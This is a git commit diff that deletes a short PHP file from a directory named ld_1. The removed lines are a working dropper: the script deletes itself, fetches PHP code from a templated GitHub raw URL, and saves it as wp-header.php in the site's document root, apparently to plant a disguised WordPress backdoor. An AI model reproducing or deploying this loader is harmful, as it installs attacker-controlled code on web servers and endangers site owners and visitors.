5157737d5926a6c8db96749cec013ba24246ea3b
dallasdilla <DallasDillard1997@proton.me>
2025-12-17 09:35:30 +0100

    Delete ld_1 directory

--- ld_1/sUK9eQyOhujGD.php
+++
@@ -1,8 +0,0 @@
-<?php
-unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
-$c = file_get_contents('https://raw.githubusercontent.com/{GIT_DATA}/refs/heads/main/{V2_SUBDIR}/{slug}.php');
-if (strpos($c, '<?php')===false)  die('err dl');
-if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-header.php')) die('file exist');
-$r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-header.php', $c);
-if ($r===false) die('err saving');
-die('/wp-header.php');
